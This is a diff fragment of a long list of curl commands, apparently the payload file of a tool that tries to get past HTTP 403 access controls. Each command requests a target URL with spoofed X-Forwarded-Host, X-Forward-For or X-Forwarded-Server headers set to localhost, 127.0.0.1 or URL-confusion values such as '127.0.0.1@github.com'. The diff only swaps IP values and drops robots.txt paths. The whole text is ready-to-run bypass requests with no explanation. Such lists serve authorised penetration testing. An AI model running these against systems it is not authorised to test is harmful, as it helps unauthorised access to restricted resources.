 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6525,7 +6525,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6539,8 +6539,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6562,22 +6562,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6588,7 +6588,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6602,8 +6602,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6625,22 +6625,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6651,7 +6651,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: h
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6665,8 +6665,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: h
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6688,10 +6688,10 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Server: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Scheme: https' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Scheme: http' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6700,16 +6700,16 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Protocol:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Proto: https' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Proto: http' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6720,7 +6720,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6734,8 +6734,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6757,22 +6757,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
